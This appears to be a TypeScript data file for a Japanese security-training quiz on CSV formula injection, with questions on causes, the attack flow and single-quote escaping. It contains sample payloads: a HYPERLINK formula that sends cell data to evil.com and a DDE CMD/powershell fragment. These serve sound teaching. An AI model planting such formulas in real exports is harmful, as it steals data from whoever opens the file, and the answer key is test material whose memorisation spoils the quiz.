import type { QuizData } from "../../components/quiz/types";

/**
 * CSV Injection (Formula Injection) - 理解度テスト用クイズデータ
 * 選択式2問、正誤判定2問、並べ替え1問、穴埋め2問（計7問）
 */
export const quizData = {
  title: "CSV Injection - 理解度テスト",
  description:
    "CSVインジェクション（数式インジェクション）の攻撃手法・仕組み・対策についての理解度をチェックしましょう。",
  questions: [
    // === 選択式（Multiple Choice）===
    {
      id: "mc-1",
      type: "multiple-choice",
      text: "CSV インジェクションが発生する原因として正しいものはどれか？",
      options: [
        "CSV ファイルがウイルスに感染している",
        "ユーザー入力がサニタイズされずに CSV に含まれ、スプレッドシートが数式として実行する",
        "Web サーバーが CSV ファイルを暗号化していない",
        "ブラウザが CSV ファイルを自動的に実行する",
      ],
      correctIndex: 1,
      explanation:
        "CSV インジェクションは、ユーザー入力がサニタイズされずに CSV ファイルに含まれることで発生します。Excel や Google Sheets は =, +, -, @ で始まるセルを数式として自動的に解釈・実行するため、攻撃者の入力が数式コードとして動作してしまいます。Webサーバー側では問題なく、開いたスプレッドシートで被害が発生します。",
      referenceLink: "/step02-injection/csv-injection",
    },
    {
      id: "mc-2",
      type: "multiple-choice",
      text: "CSV エクスポート時の数式インジェクション防止策として最も効果的なものはどれか？",
      options: [
        "CSV ファイルを ZIP で圧縮して配布する",
        "数式トリガー文字（=, +, -, @）で始まるセルの先頭にシングルクォートを付加する",
        "CSV の Content-Type を application/json に変更する",
        "ファイル名にランダムな文字列を付与する",
      ],
      correctIndex: 1,
      explanation:
        "数式トリガー文字で始まるセルの先頭にシングルクォート ' を付加することが最も効果的な対策です。Excel はシングルクォートで始まるセルの値をテキストリテラルとして扱い、数式として解釈しません。ユーザーに表示される値はシングルクォートを除いた元の値のままです。",
      referenceLink: "/step02-injection/csv-injection",
    },

    // === 正誤判定（True/False）===
    {
      id: "tf-1",
      type: "true-false",
      text: "CSV インジェクションでは、Windows の Excel で DDE（Dynamic Data Exchange）を利用して OS コマンドを実行できる可能性がある。",
      correctAnswer: true,
      explanation:
        "Windows の Excel では DDE を利用して =CMD|'/C powershell ...'!A0 のようなペイロードで OS コマンドを直接実行できるケースがあります。これにより CSV インジェクションは OS コマンドインジェクションと同じ被害レベルに達する可能性があり、管理者の PC 上で任意のコマンドが実行されます。",
      referenceLink: "/step02-injection/csv-injection",
    },
    {
      id: "tf-2",
      type: "true-false",
      text: "CSV インジェクションは Web サーバー上で攻撃が発生するため、サーバーのセキュリティ対策で完全に防止できる。",
      correctAnswer: false,
      explanation:
        "CSV インジェクションは Web サーバー上ではなく、CSV ファイルを開いたクライアント（スプレッドシートアプリケーション）上で攻撃が発生します。サーバーにとっては単なる文字列ですが、スプレッドシートにとっては実行可能なコードです。対策はサーバー側でのエスケープ処理（出力時のサニタイズ）で行います。",
      referenceLink: "/step02-injection/csv-injection",
    },

    // === 並べ替え（Ordering）===
    {
      id: "ord-1",
      type: "ordering",
      text: "CSV インジェクションによるデータ窃取攻撃の流れを正しい順序に並べ替えてください。",
      items: [
        "攻撃者が Web フォームに =HYPERLINK(\"https://evil.com/steal?d=\"&A1, \"詳細\") を入力する",
        "サーバーが入力値をサニタイズせずにデータベースに保存する",
        "管理者が CSV エクスポート機能でデータをダウンロードする",
        "管理者が CSV を Excel で開き、スプレッドシートが数式として実行する",
        "HYPERLINK 関数により他のセルのデータが攻撃者のサーバーに送信される",
      ],
      correctOrder: [0, 1, 2, 3, 4],
      initialOrder: [3, 0, 4, 2, 1],
      explanation:
        "攻撃者がフォームに数式を入力し、サーバーがそのまま保存します。管理者が CSV エクスポートすると、数式がセルに含まれた状態でファイルが生成されます。管理者が Excel でファイルを開くと数式が実行され、HYPERLINK 関数により他のセルのデータが攻撃者のサーバーに外部送信されます。",
      referenceLink: "/step02-injection/csv-injection",
    },

    // === 穴埋め（Fill in the Blank）===
    {
      id: "fib-1",
      type: "fill-in-blank",
      text: "Excel がセルの値を数式として解釈する先頭文字のうち、最も一般的なものは ______ である。（記号1文字で回答）",
      correctAnswers: ["="],
      explanation:
        "= はスプレッドシートで最も一般的な数式の開始文字です。=SUM(), =HYPERLINK(), =CMD| などの数式はすべて = で始まります。他にも +, -, @, タブ文字、CR文字が数式トリガーとなりますが、= が最も広く使われます。",
      referenceLink: "/step02-injection/csv-injection",
    },
    {
      id: "fib-2",
      type: "fill-in-blank",
      text: "CSV エクスポート時のエスケープ処理では、数式トリガー文字で始まるセルの先頭に ______ を付加することで、Excel にテキストとして解釈させる。（記号1文字で回答）",
      correctAnswers: ["'"],
      explanation:
        "シングルクォート ' を先頭に付加すると、Excel はそのセルの値をテキストリテラルとして扱い、数式として解釈しません。=HYPERLINK(...) が '=HYPERLINK(...) に変換されると、Excel はこれを数式ではなくテキストとして表示します。シングルクォート自体は画面に表示されません。",
      referenceLink: "/step02-injection/csv-injection",
    },
  ],
} satisfies QuizData;
